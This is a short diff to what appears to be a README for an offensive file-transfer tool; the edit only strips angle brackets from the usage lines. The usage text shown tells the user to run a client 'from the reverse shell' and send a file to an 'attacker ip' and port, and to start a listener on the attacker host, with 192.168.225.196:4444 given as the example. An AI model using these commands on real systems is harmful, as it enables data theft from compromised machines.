@@ -61,7 +61,7 @@ Compile the C program , ft_clie.c using
   
   or
   
-  .\client_ft.exe <filename> <attackerip> <attackerport>
+  .\client_ft.exe filename attackerip attackerport
   
   from the reverse shell
   </p></b>
@@ -70,7 +70,7 @@ Compile the C program , ft_clie.c using
   In the mean while , compile the serverfiletransfer.c using 
   gcc serverfiletransfer.c -o serv 
   
-  Syntax: ./serv <localattackerip> <chosenport> 
+  Syntax: ./serv localattackerip chosenport
   or 
   ./serv 192.168.225.196 4444
   
